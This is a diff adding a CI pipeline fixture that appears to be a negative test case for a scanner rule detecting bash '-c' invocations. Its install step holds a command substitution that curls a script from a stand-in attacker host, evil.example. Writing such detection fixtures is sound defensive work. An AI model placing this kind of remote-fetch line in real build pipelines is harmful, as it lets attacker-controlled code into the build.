@@ -1,0 +1,10 @@
+# clean: a flag bundle that carries no `c` at all is not this shell's -c
+# invocation, whatever else sits on the line. `-eu` names two boolean
+# flags and nothing else; the script argument that happens to name a
+# command substitution is passed to `script.sh`, not read by -c as a
+# command string. This pins the negative space of the -c-anywhere-in-
+# the-bundle match: a bundle missing `c` entirely stays out of this rule.
+install:
+  image: alpine:3.19
+  script:
+    - bash -eu script.sh "$(curl -fsSL https://evil.example/i.sh)"
